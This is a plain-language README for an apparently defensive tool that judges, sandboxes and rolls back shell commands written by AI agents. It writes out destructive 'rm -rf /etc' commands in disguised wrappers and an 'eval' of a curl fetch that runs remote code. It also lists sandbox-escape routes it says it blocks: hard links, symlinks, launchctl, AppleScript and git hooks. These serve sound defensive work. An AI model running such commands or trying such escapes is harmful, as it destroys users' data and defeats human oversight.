# AgentShield, in plain words

This is the no-jargon version. [DESIGN.md](DESIGN.md) is the version with the
details and the arguments; this one is for explaining the project to someone in
two minutes.

---

## The problem

AI agents write shell commands and then run them. Most of the time that's fine.
Occasionally the agent writes something that deletes your files, force-pushes
over your work, or pipes a script off the internet straight into a shell.

You can't just review every command by hand — the whole point of an agent is
that it works while you don't. And you can't just block a list of bad commands,
because there are infinite ways to write the same bad command.

## What this does

Two things, one after the other:

1. **Looks at the command before running it** and decides: fine, run it in a
   cage, ask a human, or refuse outright.
2. **Takes a snapshot of your files first**, so if the command turns out to
   have caused damage, everything goes back the way it was.

Think of it as a bouncer plus an undo button. The bouncer stops the obvious
trouble. The undo button handles the trouble the bouncer didn't recognise.

---

## The six steps

Every command goes through the same sequence.

### 1. Read the command and judge it

The command gets parsed properly — not searched for scary words, actually
parsed, the way a shell would read it. Then it's checked against a list of
rules, and one of four answers comes out:

| Answer | Meaning |
|---|---|
| **allow** | No rule objected. Run it normally. |
| **confine** | Run it, but locked inside the project folder. |
| **ask** | A human should look at this first. |
| **deny** | Don't run it at all. |

If several rules fire at once, the **strictest one wins**. Rewriting the rule
file in a different order can't turn a "deny" into an "allow".

**The trick this handles that most tools don't:** hiding a command inside
another command. All of these delete the same files, and only the first one
looks like an `rm` command:

```
rm -rf /etc
sudo rm -rf /etc
timeout 5 rm -rf /etc
find . -exec rm -rf /etc {} \;
bash -c 'rm -rf /etc'
```

Rather than writing a rule for each disguise — which never ends — the system
unwraps the disguise and judges what's actually inside. One rule about `rm`
covers all five.

**And when it can't tell:** if the command is gibberish it can't parse, or it's
so convoluted that checking it takes too long, it does *not* shrug and allow it.
It gets stricter, not looser. Confusion is treated as a bad sign.

### 2. Take a snapshot

Before anything runs, the current state of the project folder is recorded:
which files exist, and what's in them.

The tricky part is files that aren't saved in git yet. Git's own snapshot tools
ignore those — so if a command deletes a file you hadn't committed, git has no
record it ever existed and it's gone forever. This saves those separately, on
purpose, because that's the loss you can't recover from.

*Not covered:* files outside the project folder, and things listed in
`.gitignore` like `node_modules` or build output — copying those could mean
gigabytes for no benefit.

### 3. Build the cage

The rules from step 1 also say what the command legitimately *needs* — write to
files? reach the network? So the cage is built to fit that command specifically,
rather than being one loose cage that fits every command.

The cage is enforced by the operating system itself, not by this program. On a
Mac it uses Apple's sandbox; on Linux it uses the kernel's own file and
system-call restrictions. That matters: a program asking nicely can be talked
out of it, but the kernel just says no.

One detail worth knowing: if no rule recognised the command at all, it still
gets to write inside its own project folder. "Confined" means *scoped to* the
folder, not *locked out of* it — otherwise every unfamiliar command would fail
on its first write, which is useless.

### 4. Run it

The command runs with a completely blank environment — none of your
environment variables get passed in. This is deliberate. Your shell is where
`AWS_SECRET_ACCESS_KEY` and `GITHUB_TOKEN` live, and handing those to a command
an AI wrote would give away every password you have. Locking down the files and
then leaking the credentials would protect nothing worth protecting.

It also gets its own scratch folder (deleted afterwards), its home folder points
at the project rather than your real one, and there's a time limit so a command
that hangs gets killed instead of sitting there forever.

### 5. Check what actually happened

Three separate questions:

- Did it exit with an error?
- Did any health check you configured fail?
- Did any file you marked as protected change?

That last one is the important one. **A command exiting successfully doesn't
mean it did no harm.** `echo garbage > config.yml` succeeds perfectly and
destroys your config. So protected files are fingerprinted before and after,
and a change is caught regardless of whether the command "worked".

The first question is off by default, and that surprises people. A failing test
suite exits with an error — and rolling back the fix you were testing is exactly
the wrong response. So you opt into that one when it makes sense for you.

### 6. Put it back, if needed

If any of those checks raised a flag, the folder is restored to the step-2
snapshot. Tracked files go back, deleted files come back, and the reasons are
recorded so you can see *why* it rolled back rather than just noticing your work
vanished.

Rollback is itself destructive — it overwrites files — so every path it's about
to touch is checked to make sure it's really inside the project folder. A
snapshot taken in a different folder is refused rather than applied.

---

## The one thing to actually understand

**The command checker is not the security.**

It's genuinely impossible to look at a shell command and know what it will do.
This one line proves it:

```
eval "$(curl https://example.com/x)"
```

Nobody — no tool, no AI, no human — can tell what that does without fetching the
URL, and the answer can be different a second later. So a checker that claims to
know is lying.

That's why there are two layers. The checker is a **fast filter**: it catches
obvious trouble in a few microseconds, explains its reasoning in words a person
can read, and works out what the command needs so the cage can be built tightly.
The **cage and the snapshot** are the actual protection. An "allow" verdict
means "no rule objected" — never "this is safe".

Any single-layer version of this tool would be security theatre.

---

## How fast, and why that matters

The checker takes about **3 microseconds** for a typical command, and under
**14 microseconds** for 99% of them. That's roughly a thousandth of the time it
takes to start a process.

This is the whole reason the design works. If checking cost a noticeable amount
of time, people would check *some* commands. At this speed you check every
command without thinking about it, and there's no fast path for anyone to
accidentally take.

---

## Running a whole agent inside it

Everything above judges and cages one command at a time. That only helps if every
command actually goes through it — and an agent like Claude Code or Codex has its
own ways to change files, its own modes ("ask me first", "auto", "bypass
permissions"), and settings that can be edited.

So there is a second way to use it: put the **whole agent** in the cage.

```
shellguard shell -w ~/project -- claude
```

The difference from the agent's own modes is who does the refusing. An agent's
permission mode is the agent deciding whether to ask you; in "bypass" it doesn't ask
at all. Inside `shellguard shell` it's the **operating system** refusing — the agent
can be in any mode, edit any setting, run any command, and a file outside your
project still cannot be changed, because the kernel says no. We tried the sneaky
routes too: hard links, symlinks, scheduling a job with `launchctl`, asking another
app to do it with AppleScript, writing preferences through the system's preferences
service. All refused.

What else a session does:

- Your secrets are hidden: `~/.ssh`, `~/.aws`, browser profiles, your shell history,
  another agent's login and so on can't be read, and passwords or tokens in your
  environment are removed before the agent starts (it keeps its own). npm still
  gets your registry settings, just not the tokens in `~/.npmrc`. Your shell's
  startup files (`~/.zshrc` and friends) stay readable, because hiding them breaks
  your `PATH`; if one has a token written in it, the session tells you which one,
  by name, when it starts.
- It can't borrow your SSH keys through the SSH agent, or ask Docker to do something
  for it (Docker can reach your whole disk).
- It can't plant a git hook in your project that would run the next time *you*
  commit.

What it does **not** do: stop the agent sending things over the internet. The agent
needs the internet to talk to its model, and everything it runs gets the same
access. So a session protects your files from being changed or deleted; it doesn't
stop the agent from leaking what it can read in your project.

---

## What it can't do yet

Being straight about this, because the gaps are real:

- **The virtual-machine backends aren't proven.** The default mode — an OS-level
  cage around a normal process — is tested and works. The heavier
  virtual-machine options generate valid configuration but nobody has watched
  one boot end to end. They report themselves as unavailable rather than
  pretending.
- **There's a faster snapshot method on Linux that isn't built.** The git-based
  one works everywhere and is what runs today.
- **The audit log is a record, not a seal.** Every judgment and run can be
  written to a log with passwords and tokens scrubbed out. A command can't
  tamper with it, but it can be edited by another program running as you, and
  it only knows about commands that went through AgentShield.
- **No memory or CPU limits** on what a command can consume.
- **Whole-agent sessions are macOS only**, and have been tested with a stand-in
  agent and with the real Claude Code and Codex starting up — but not yet with a
  full real session doing work, because both logins on the test machine had expired.
- **Swapping rules in a running program is safe, but it isn't magic.** A program
  that's already running can load new rules without restarting, all-or-nothing,
  and a broken or half-saved rules file is refused. Rules that make things
  *looser* are refused too unless you say you mean it. What it can't notice is a
  rule that keeps its name and severity but quietly matches more.

---

## Where to look in the code

| If you want to see… | Look at |
|---|---|
| The whole sequence in one file | `crates/shellguard-runtime/src/engine.rs` |
| How disguised commands get unwrapped | `crates/shellguard-gate/src/unwrap.rs` |
| The rules themselves, in plain text | `policies/default.policy` |
| Snapshots and restoring | `crates/shellguard-runtime/src/rollback.rs` |
| The cages | `crates/shellguard-enforce/` |
| Using it from Python | `python/agent_sandbox/binding.py` |

The rules file is worth opening even if you read nothing else — it's the part
you'd actually change, and it's written to be read.
